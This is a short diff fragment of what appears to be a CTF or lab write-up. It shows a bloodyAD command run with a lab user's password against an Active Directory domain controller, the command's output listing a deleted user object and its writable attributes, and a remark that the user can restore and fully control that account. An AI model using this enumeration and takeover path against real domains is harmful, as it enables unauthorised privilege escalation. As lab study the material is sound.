@@ -638,5 +638,21 @@ Now remembering back to the beginning it said sam had left the company, maybe os
 ```python
 bloodyAD --host sg-dc01.shadowgate.local -d shadowgate.local -u oscar.m -p 'Password123!' get writable --detail
 
+distinguishedName: CN=sam.h\0ADEL:c9316c03-4a09-4d46-9db0-f45925e154f1,CN=Deleted Objects,DC=shadowgate,DC=local
+ms-net-ieee-80211-GroupPolicy: CREATE_CHILD
+nTFRSSubscriptions: CREATE_CHILD
+classStore: CREATE_CHILD
+ms-net-ieee-8023-GroupPolicy: CREATE_CHILD
+shadowFlag: WRITE
+shadowExpire: WRITE
+shadowInactive: WRITE
+shadowWarning: WRITE
+shadowMax: WRITE
+shadowMin: WRITE
+shadowLastChange: WRITE
+loginShell: WRITE
 
+...[SNIP]...
 ```
+
+It looks like oscar can restore the user and he also has full control over the user 
